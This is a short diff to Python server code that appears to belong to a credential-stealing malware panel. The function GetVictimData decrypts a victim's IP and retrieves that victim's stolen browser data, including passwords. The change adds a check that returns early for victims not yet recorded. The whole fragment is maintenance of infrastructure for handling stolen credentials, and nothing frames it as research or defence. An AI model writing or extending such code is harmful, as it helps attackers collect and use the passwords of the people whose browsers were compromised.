@@ -103,6 +103,10 @@ def GetVictimData():
 
         VictimIP = crypt.DecryptBuffer(VictimIP)
         CurrentVictim = Victim(VictimIP)
+
+        if CurrentVictim.IsNew is True:
+            return 'The requested victim does not exist', 204
+
         VictimData = CurrentVictim.GetVictimBrowserData()
 
         passwords = VictimData["PASSWORDS"]
